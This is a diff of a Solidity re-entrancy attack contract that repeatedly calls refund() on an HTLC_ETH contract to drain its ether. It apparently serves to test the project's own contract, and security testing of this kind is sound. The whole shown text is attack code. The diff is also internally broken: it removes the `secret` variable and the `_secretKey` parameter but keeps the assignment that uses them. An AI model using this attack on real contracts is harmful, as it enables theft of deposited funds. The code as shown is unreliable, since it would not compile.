@@ -3,12 +3,12 @@ pragma solidity 0.8.10;
 import "../htlc/HTLC_ETH.sol";
 
 
-contract ReEntrancy {
+contract RefundReEntrancy {
 
     HTLC_ETH htlcEth;
 
     bytes32 id;
-    bytes32 secret;
+    
 
     constructor(address _htlcEthAddress) {
 
@@ -24,7 +24,6 @@ contract ReEntrancy {
 
         if(address(htlcEth).balance >= 0.2 ether) {
 
-            //htlcEth.issuerWithdrawal(id, secret);
             htlcEth.refund(id);
 
         }
@@ -33,11 +32,10 @@ contract ReEntrancy {
 
     
 
-    function attack(bytes32 _swapID, bytes32 _secretKey) external {
+    function attack(bytes32 _swapID) external {
         id = _swapID;
         secret = _secretKey;
 
-        //htlcEth.issuerWithdrawal(_swapID, _secretKey);
         htlcEth.refund(_swapID);
 
     }
